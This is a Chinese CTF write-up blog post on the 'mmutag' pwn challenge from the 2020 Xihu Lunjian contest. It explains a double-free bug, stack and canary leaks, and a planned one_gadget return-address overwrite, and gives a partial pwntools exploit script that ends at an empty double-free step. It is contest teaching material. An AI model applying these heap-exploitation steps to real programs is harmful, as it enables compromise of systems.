---
title: 【CTF题解-0x07】西湖论剑2020 write up by arttnb3
date: 2020-10-09 19:18:03
tags:
	- 堆
	- double free
	- one_gadget
	- partial overwrite
categories: CTF
---

# 0x00.绪论

> 新技术在快速迭代更新，要求网络安全从业者必须与时俱进、不断学习，在实战中锻炼技艺，以往的竞赛模式已满足不了贴合实战的竞赛需求。
>
> 2020第四届中国杭州网络安全技能大赛以“人才：应对网络安全新变局”为主题，推陈出新、聚焦品质，力求创新、实战化，让参赛者学有所成，为国家网络安全队伍建设，聚集真正有实战能力的人才。大赛总奖金池高达数百万元，丰厚奖励激励优秀人才！
>
> [第四届西湖论剑网络安全技能大赛](https://game-pc.gcsis.cn)

简单来说就是一个大佬云集的比赛，本菜鸡只是蹭了蹭协会的号参观了一哈（虽然说当天其实没写出来题XD

当然baby pwner只会pwn，所以下面的都是pwn题题解

<!--more-->

> 注：原题皆可在本页面下载

# 0x01.Pwn

## 0x00.mmutag - double free + one_gadget

[点击下载 - mmutag](/download/xhlj2020/mmutag/mmutag)

[点击下载 - libc.so.6](/download/xhlj2020/mmutag/libc.so.6)

惯例的```checksec```，发现开了NX保护和canary

![image.png](https://i.loli.net/2020/10/14/4IYR8gap7NmwrJC.png)

拖入IDA进行分析（部分变量函数名经重命名

首先我们可以看到该程序在开头泄露了一个栈上地址给我们

![image.png](https://i.loli.net/2020/10/14/cqejAENTQtuBsbJ.png)

我们可以发现该程序新分配的堆块大小都为```0x80```，在fastbin范围内

![image.png](https://i.loli.net/2020/10/14/t1WmaRzxOwTG8j4.png)

同时我们可以发现在程序释放堆块时并未将堆表指针置0，存在**double free**漏洞

![image.png](https://i.loli.net/2020/10/14/3BpvnsDoeHtNZbS.png)

同时在堆表操作页面我们发现可以通过选项```3```进行**partial overwrite**以**泄露canary的值**

![image.png](https://i.loli.net/2020/10/14/dzRfrx62jquUGMi.png)

故考虑通过double free进行任意地址写：构造fake chunk修改主函数的返回地址为one_gadget以getshell

故构造exp如下：

```python
from pwn import *
p = process('./mmutag')
e = ELF('./mmutag')
libc = ELF('./libc.so.6')

def write_intro(content):
    p.recvuntil(b'please input your choice:\n\n')
    p.sendline(b'1')
    p.recvuntil(b'please input your introduce \n')
    p.send(content)
    
def heap_menu():
    p.recvuntil(b'please input your choice:\n\n')
    p.sendline(b'2')
    
def alloc(index:int,content):
    p.recvuntil(b'please input your choise:\n')
    p.sendline(b'1')
    p.recvuntil(b'please input your id:\n')
    p.sendline(str(index).encode())
    p.recvuntil(b'input your content\n')
    p.send(content)
    p.recvuntil(b'OK!\n')
    
def free(index:int):
    p.recvuntil(b'please input your choise:\n')
    p.sendline(b'2')
    p.recvuntil(b'please input your id:\n')
    p.sendline(str(index).encode())
    p.recvuntil(b'OK!\n')
    
def write_content(content):
    p.recvuntil(b'please input your choise:\n')
    p.sendline(b'3')
    p.send(content)

def go_back():
    p.recvuntil(b'please input your choise:\n')
    p.sendline(b'4')

#leak stack addr
p.recvuntil(b'please input you name: ')
p.sendline(b'arttnba3')
p.recvuntil(b'this is your tag: ')
stack_leak = int(p.recvuntil(':',drop = True).ljust(8,b'\x00'),16)
print('[*]stack value leak:' + hex(stack_leak))

#leak canary
payload1 = b'A'*0x18
write_content(payload1)
p.recvuntil(payload1)
canary = u64(p.recv(7).rjust(8,b'\x00'))

#double free

```



>  一开始做的时候漏看了一个取地址符，导致我以为开头泄露的是堆基址...
>
> 以后做题还是要细心些XDD

> 注：以下为当天的队内交流信息
>
> 以及赤道🐧师傅yyds
>
> ![image.png](https://i.loli.net/2020/10/14/UmWaVKtJQTEe9qD.png)